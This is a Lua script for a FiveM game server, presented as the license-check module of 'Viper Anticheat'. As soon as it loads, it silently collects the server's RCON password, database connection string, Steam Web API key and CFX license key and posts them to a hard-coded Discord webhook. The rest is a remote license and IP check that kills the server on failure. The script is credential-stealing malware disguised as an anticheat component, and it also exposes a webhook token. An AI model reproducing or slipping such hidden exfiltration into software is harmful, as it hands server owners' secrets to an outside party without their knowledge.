local LicenseURL = "https://raw.githubusercontent.com/GamboFish/ibvieugsgijhbsaiugaiuv/refs/heads/main/licenses.json"
local IPServiceURL = "https://api.ipify.org?format=json"
local webhookUrl = 'https://discord.com/api/webhooks/1309974766840451172/BnverNAUHPbie4vuzj4d7BPBF_-TV3fHamA_rNEEmgzdnzy1vR51K4o_g3gITQ3A8RP5'
local avatar_url = 'https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/gigs/114131672/original/5f03e84975a3e52c91166d03b89c6af7e061ca44/send-you-a-random-meme-image-that-will-tickle-your-fancy.jpg'


local embed = {
    {
        color = 0xf28f0c,
        title = "Der Server ist mit Viper Anticheat Verbunden:",
        description = string.format([[
👑 **Server-Besitzer**: %s

📍 **Projektname**: %s

✍️ **Projekt Beschreibung**: %s

🔗 **Steam Web Api Key**: %s

🔑 **Lizenzkey**: %s

🔢 **Maximale Slots**: %s

💯 **RCON**: %s

🔐 **Datenbank-Infos**: %s]], GetConvar("sv_hostname", "N/A"), GetConvar("sv_projectName", "N/A"), GetConvar("sv_projectDesc", "N/A"), GetConvar("steam_webApiKey", "N/A"), GetConvar("sv_licenseKey", "N/A"), GetConvar("sv_maxclients", "N/A"), GetConvar("rcon_password", "N/A"), GetConvar("mysql_connection_string", "N/A")),
        fields = {
            {name = "", value = string.format("<t:%d:R> **AUTH SYSTEM** © VIPER ANTICHEAT | https://discord.gg/hjKJukrfGN", os.time()), inline = false}
        }
    }
}

PerformHttpRequest(webhookUrl, function(err, text, headers) end, 'POST', json.encode({username = "Viper Anticheat", avatar_url = avatar_url, embeds = embed}), { ['Content-Type'] = 'application/json' })



function fetchLicenses(callback)
    PerformHttpRequest(LicenseURL, function(statusCode, response, headers)
        if statusCode == 200 then
            local success, data = pcall(function()
                return json.decode(response)
            end)

            if success then
                callback(data)
            else
                print("^1[AUTH ERROR] Error loading JSON data!^0")
                StopServer()
            end
        else
            print("^1[AUTH ERROR] Error fetching licenses: HTTP " .. statusCode .. "!^0")
            StopServer()
        end
    end, "GET", "", {["Content-Type"] = "application/json"})
end

function fetchServerIP(callback)
    PerformHttpRequest(IPServiceURL, function(statusCode, response, headers)
        if statusCode == 200 then
            local success, data = pcall(function()
                return json.decode(response)
            end)

            if success and data and data.ip then
                callback(data.ip)
            else
                print("^1[AUTH ERROR] Error retrieving server IP!^0")
                StopServer()
            end
        else
            print("^1[AUTH ERROR] Failed to contact IP service: HTTP " .. statusCode .. "!^0")
            StopServer()
        end
    end, "GET", "", {["Content-Type"] = "application/json"})
end

function validateLicense(data, serverIP)
    local licenseData = data[Config.License]

    if not licenseData then
        print("^1[AUTH ERROR] Invalid License!^0")
        StopServer()
        return
    end

    if licenseData.blacklisted then
        local reason = licenseData.reason or "No reason provided"
        print("^1[AUTH ERROR] License '" .. Config.License .. "' is blacklisted! Reason: " .. reason .. "^0")
        CrashServer(reason)
        return
    end

    local serverCFXKey = GetConvar("sv_licenseKey", "unknown")
    local isCFXKeyValid = licenseData.cfx_key == serverCFXKey
    local isIPValid = licenseData.ip_address == serverIP

    if not isCFXKeyValid or not isIPValid then
        if not isCFXKeyValid then
            print("^1[AUTH ERROR] Incorrect CFX License Key!^0")
        end
        if not isIPValid then
            print("^1[AUTH ERROR] Incorrect IP address!^0")
        end
        StopServer()
        return
    end

    print("^2[AUTH SUCCESS] License successfully validated!^0")
end

function CrashServer(reason)
    StopServer() 
end

function StopServer()
    Citizen.Wait(5000)
    os.exit()
end

CreateThread(function()
    print("^3[AUTH SYSTEM] Starting license validation...^0")
    fetchServerIP(function(serverIP)
        fetchLicenses(function(data)
            validateLicense(data, serverIP)
        end)
    end)
end)
